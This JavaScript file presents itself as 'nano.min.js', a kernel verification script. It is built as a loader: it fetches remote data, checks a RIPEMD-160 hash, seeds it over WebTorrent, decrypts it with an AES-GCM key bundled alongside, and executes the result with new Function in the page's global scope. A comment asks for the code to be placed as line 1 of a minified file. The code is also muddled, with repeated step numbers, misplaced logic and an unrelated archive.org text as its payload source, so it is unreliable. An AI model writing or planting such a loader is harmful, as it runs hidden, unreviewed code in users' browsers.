// nano.min.js (Kernel Verification & Execution Script)
import { ripemd160 } from '@noble/hashes/ripemd160';
import { bytesToHex } from '@noble/hashes/utils';

const webseedURL = "https://archive.org/stream/5703572-Education-Spending-in-Public-Schools-Study/5703572-Education-Spending-in-Public-Schools-Study_djvu.txt";

(async function() {
    // Put this as line 1 of nano.min.js
    try {
        // 1. Fetch encrypted bundle package
        const res = await fetch('./src/Gate.bundle.enc');
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
        const packageData = await res.json();

        if (packageData.cipherProtocol !== 'GFQM') {
            throw new Error('Unsupported cipher protocol');
        }

        const iv = Uint8Array.from(matchHex(packageData.iv));
        const keyBytes = Uint8Array.from(matchHex(packageData.secretKeyMock));
        const authTag = Uint8Array.from(matchHex(packageData.authTag));
        
       // 1. Perform the security audit first by pulling the file via AJAX
$.get(webseedURL, async (rawFileData) => {
    try {
        // Convert to Uint8Array for RIPEMD-160 validation
        const rawCiphertext = typeof rawFileData === 'string' 
            ? Uint8Array.from(rawFileData, c => c.charCodeAt(0)) 
            : new Uint8Array(rawFileData);

        // 2. Perform strict RIPEMD-160 integrity verification
        const computedHashDigest = ripemd160(rawCiphertext);
        const computedHex = bytesToHex(computedHashDigest);

        if (computedHex !== packageData.ripemd160Hash) {
            throw new Error(`[SECURITY ALERT] RIPEMD-160 mismatch! Expected ${packageData.ripemd160Hash}, got ${computedHex}`);
        }
        console.info('[nano.js KERNEL] RIPEMD-160 integrity verification passed securely.');

        // 3. Construct the deterministic magnet link using your verified hash
        const magnetURI = `magnet:?xt=urn:btih:${computedHex}&dn=Gate.enc.js`;

        if (window.client) {
            let existingTorrent = window.client.get(computedHex);
            if (existingTorrent) {
                console.info(`[NANO KERNEL] Swarm already active: ${existingTorrent.infoHash}`);
                window.WebTorrentBase = window.WebTorrentBase || {};
                window.WebTorrentBase.SWARM = existingTorrent;
                if (typeof onGateReady === 'function') onGateReady(existingTorrent);
                return;
            }

            // 4. Add the torrent with the webseed URL explicitly included in urlList
            window.client.add(magnetURI, {
                infoHash: computedHex,
                urlList: [webseedURL], // <-- Restored webseed URL for data pulling/seeding
                announce: [],          // No public trackers
                dht: false,
                pex: true              // Peer Exchange enabled for local mesh discovery
            }, (torrent) => {
                console.info(`[NANO KERNEL] Sovereign swarm locked with active webseed: ${torrent.infoHash}`);
                
                window.WebTorrentBase = window.WebTorrentBase || {};
                window.WebTorrentBase.SWARM = torrent;
                
                if (typeof onGateReady === 'function') onGateReady(torrent);
            });
            // 4. Prepare AES-GCM data (append authTag to raw ciphertext for Web Crypto compliance)
            const encryptedData = new Uint8Array(rawCiphertext.length + authTag.length);
            encryptedData.set(rawCiphertext);
            encryptedData.set(authTag, rawCiphertext.length);

            // 5. Decrypt payload via SubtleCrypto
            const cryptoKey = await crypto.subtle.importKey(
                'raw',
                keyBytes,
                { name: 'AES-GCM' },
                false,
                ['decrypt']
            );

            const decryptedBuffer = await crypto.subtle.decrypt(
                { name: 'AES-GCM', iv: iv, tagLength: 128 },
                cryptoKey,
                encryptedData
            );

            const decryptedCode = new TextDecoder().decode(decryptedBuffer);

            // 6. Execute decrypted code natively in window scope
            const executeCode = new Function(decryptedCode);
            executeCode();
            console.info('[nano.js KERNEL SUCCESS] Gate.bundle.enc successfully compiled and executed.');
        }

    } catch (err) {
        console.error('[NANO KERNEL] Integrity check or swarm initialization failed:', err);
    }
}).fail((jqXHR, textStatus, errorThrown) => {
    console.error(`[NANO KERNEL] Failed to pull payload from webseed URL (${webseedURL}):`, textStatus, errorThrown);
});

    } catch (err) {
        console.error('[nano.js KERNEL ERROR]:', err);
    }
})();

function matchHex(hexString) {
    return hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16));
}